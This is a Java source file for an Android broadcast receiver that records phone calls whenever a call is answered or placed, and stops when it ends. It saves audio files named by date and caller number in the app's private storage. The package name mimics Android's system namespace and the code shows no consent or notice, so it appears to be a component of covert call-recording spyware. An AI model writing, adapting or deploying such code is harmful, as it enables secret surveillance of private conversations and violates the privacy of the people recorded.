package com.android.system.receiver;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.system.utils.AudioRecorder;
import com.android.system.utils.SystemUtil;

import java.io.File;

public class PhoneCallReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(final Context context, final Intent intent) {
        final String outPhoneNumber = getOutGoingCallNumber(intent);
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
        telephonyManager.listen(new PhoneStateListener(){
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                switch(state){
                    case TelephonyManager.CALL_STATE_IDLE:
                        Log.i("PHONE", "挂断");
                        AudioRecorder.stop();
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        Log.i("PHONE", "接听");
                        String recordPath = context.getFilesDir().getAbsolutePath() + "/record/";
                        new File(recordPath).mkdirs();
                        String savePath = recordPath + SystemUtil.getDateString() + "-" + (incomingNumber.length()>0 ? incomingNumber : outPhoneNumber) + ".amr";
                        AudioRecorder.start(savePath);
                        break;
                    case TelephonyManager.CALL_STATE_RINGING:
                        break;
                }
            }
        },PhoneStateListener.LISTEN_CALL_STATE);
    }

    private String getOutGoingCallNumber(Intent intent)
    {
        String number = "";
        if (null != intent)
        {
            Bundle tmpBundle = intent.getExtras();
            if (null != tmpBundle ) {
                number = getResultData();
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }

                number = tmpBundle.getString(Intent.EXTRA_PHONE_NUMBER);
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }
                number = tmpBundle.getString("number");
                if ((number != null) && (number.trim().length() > 0)) {
                    return number;
                }

                number = tmpBundle.getString("android.phone.extra.ORIGINAL_URI");
                if (number != null) {
                    try {
                        number = number.trim();
                        if ((null != number) && (4 < number.length() && (number.substring(0, 4).equalsIgnoreCase("tel:")))) {
                            return number.substring(4);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        return number;
    }
}
